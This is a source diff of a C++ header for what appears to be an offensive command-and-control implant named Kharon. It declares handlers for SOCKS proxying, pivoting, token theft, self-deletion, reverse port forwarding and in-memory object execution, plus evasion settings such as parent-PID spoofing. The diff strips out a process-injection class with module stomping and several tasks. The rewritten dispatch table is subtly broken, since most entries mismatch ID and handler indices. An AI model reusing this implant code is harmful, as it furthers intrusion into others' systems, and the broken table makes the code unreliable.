@@ -173,7 +173,6 @@ class Task;
 class Thread;
 class Process;
 class Heap;
-class Injection;
 class Library;
 class Transport;
 class Token;
@@ -213,13 +212,6 @@ typedef struct {
     ULONG Profile;
 
     struct {
-        ULONG  TechniqueId;
-        WCHAR* StompModule;
-        ULONG  Allocation;
-        ULONG  Writing;
-    } Injection;
-
-    struct {
         ULONG  ParentID;
         BOOL   Pipe;
         BOOL   BlockDlls;
@@ -237,7 +229,12 @@ typedef struct {
         CHAR* DomainName;
         CHAR* IpAddress;
         CHAR* HostName;
-    } Guardrails;
+    } Guardrails = {
+        .UserName   = nullptr,
+        .DomainName = nullptr,
+        .IpAddress  = nullptr,
+        .HostName   = nullptr
+    };
 
     struct {
         UINT8 Beacon;
@@ -309,7 +306,6 @@ namespace Root {
         Library*   Lib;
         Token*     Tkn;
         Task*      Tsk;
-        Injection* Inj;
         Heap*      Hp;
         Process*   Ps;
         Thread*    Td;
@@ -987,7 +983,6 @@ namespace Root {
             _In_ UPTR Argument
         ) -> VOID;
 
-        VOID InitInject( Injection* InjRf ) { Inj = InjRf; }
         VOID InitCrypt( Crypt* CryptRf ) { Crp = CryptRf; }
         VOID InitCoff( Coff* CoffRf ) { Cf = CoffRf; }
         VOID InitSpoof( Spoof* SpoofRf ) { Spf = SpoofRf; }
@@ -1992,13 +1987,14 @@ public:
     ) -> BOOL;
 
     auto EncodeClientData( 
+        _In_ HTTP_CONTEXT*  Ctx,
         _In_ MM_INFO*       SendData, 
         _In_ MM_INFO*       EncodedData,
-        _In_ OUTPUT_FORMAT* ClientOut,
-        _In_ PVOID*         ObjFreePtr
+        _In_ OUTPUT_FORMAT* ClientOut
     ) -> BOOL;
 
     auto DecodeServerData( 
+        _In_ HTTP_CONTEXT*  Ctx,
         _In_ MM_INFO*       RespData, 
         _In_ MM_INFO*       DecodedData,
         _In_ OUTPUT_FORMAT* ServerOut
@@ -2014,6 +2010,7 @@ public:
     ) -> BOOL;
 
     auto ProcessServerOutput(
+        _In_ HTTP_CONTEXT*  Ctx,
         _In_ HANDLE         RequestHandle,
         _In_ CHAR*          cTargetUrl,
         _In_ OUTPUT_TYPE    ServerOutType,
@@ -2096,43 +2093,6 @@ public:
     ) -> BOOL;
 };
 
-class Injection {
-private:
-    Root::Kharon* Self;
-public:
-    Injection( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-
-    struct {
-        INJ_OBJ* Object;
-        HANDLE   ReadHandle;
-        HANDLE   WriteHandle;
-    } Node[15];
-
-    auto Main(
-        _In_    BYTE*    Buffer,
-        _In_    SIZE_T   Size,
-        _In_    BYTE*    ArgBuff,
-        _In_    SIZE_T   ArgSize,
-        _Inout_ INJ_OBJ* Object
-    ) -> BOOL;
-
-    auto Stomp(
-        _In_    BYTE*    Buffer,
-        _In_    SIZE_T   Size,
-        _In_    BYTE*    ArgBuff,
-        _In_    SIZE_T   ArgSize,
-        _Inout_ INJ_OBJ* Object
-    ) -> BOOL;
-
-    auto Standard(
-        _In_    BYTE*    Buffer,
-        _In_    SIZE_T   Size,
-        _In_    BYTE*    ArgBuff,
-        _In_    SIZE_T   ArgSize,
-        _Inout_ INJ_OBJ* Object
-    ) -> BOOL;    
-};
-
 class Task {
 private:
     Root::Kharon* Self;
@@ -2150,14 +2110,6 @@ public:
     ) -> ERROR_CODE;
 
     auto Token(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto Info(
-        _In_ JOBS* Job
-    ) -> ERROR_CODE;
-
-    auto PostEx(
         _In_ JOBS* Job
     ) -> ERROR_CODE;
 
@@ -2224,23 +2176,18 @@ public:
         ERROR_CODE ( Task::*Run )( JOBS* );
     } Mgmt[TSK_LENGTH] = {
         Mgmt[0].ID  = Enm::Task::Exit,              Mgmt[0].Run  = &Task::Exit,
-        Mgmt[1].ID  = Enm::Task::FileSystem,        Mgmt[1].Run  = &Task::FileSystem,
-        Mgmt[2].ID  = Enm::Task::Process,           Mgmt[2].Run  = &Task::Process,
-        Mgmt[3].ID  = Enm::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
-        Mgmt[4].ID  = Enm::Task::Config,            Mgmt[4].Run  = &Task::Config,
-        Mgmt[5].ID  = Enm::Task::Download,          Mgmt[5].Run  = &Task::Download,
-        Mgmt[6].ID  = Enm::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
-        Mgmt[7].ID  = Enm::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
-        Mgmt[8].ID  = Enm::Task::Token,             Mgmt[8].Run  = &Task::Token,
-        Mgmt[9].ID  = Enm::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
-        Mgmt[10].ID = Enm::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
-        Mgmt[11].ID = Enm::Task::PostEx,            Mgmt[11].Run = &Task::PostEx,
-        Mgmt[12].ID = Enm::Task::ScInject,          Mgmt[12].Run = &Task::ScInject,
-        Mgmt[13].ID = Enm::Task::GetInfo,           Mgmt[13].Run = &Task::Info,
-        Mgmt[14].ID = Enm::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
-        Mgmt[15].ID = Enm::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
-        Mgmt[16].ID = Enm::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
-        Mgmt[17].ID = Enm::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
+        Mgmt[1].ID  = Enm::Task::ExecBof,           Mgmt[3].Run  = &Task::ExecBof,
+        Mgmt[2].ID  = Enm::Task::Config,            Mgmt[4].Run  = &Task::Config,
+        Mgmt[3].ID  = Enm::Task::Download,          Mgmt[5].Run  = &Task::Download,
+        Mgmt[4].ID  = Enm::Task::Upload,            Mgmt[6].Run  = &Task::Upload,
+        Mgmt[5].ID  = Enm::Task::Socks,             Mgmt[7].Run  = &Task::Socks,
+        Mgmt[6].ID  = Enm::Task::Token,             Mgmt[8].Run  = &Task::Token,
+        Mgmt[7].ID  = Enm::Task::Pivot,             Mgmt[9].Run  = &Task::Pivot,
+        Mgmt[8].ID  = Enm::Task::SelfDelete,        Mgmt[10].Run = &Task::SelfDel,
+        Mgmt[9].ID  = Enm::Task::Jobs,              Mgmt[14].Run = &Task::Jobs,
+        Mgmt[10].ID = Enm::Task::ProcessTunnels,    Mgmt[15].Run = &Task::ProcessTunnel,
+        Mgmt[11].ID = Enm::Task::ProcessDownloads,  Mgmt[16].Run = &Task::ProcessDownloads,
+        Mgmt[12].ID = Enm::Task::RPortfwd,          Mgmt[17].Run = &Task::RPortfwd
     };
 };
 
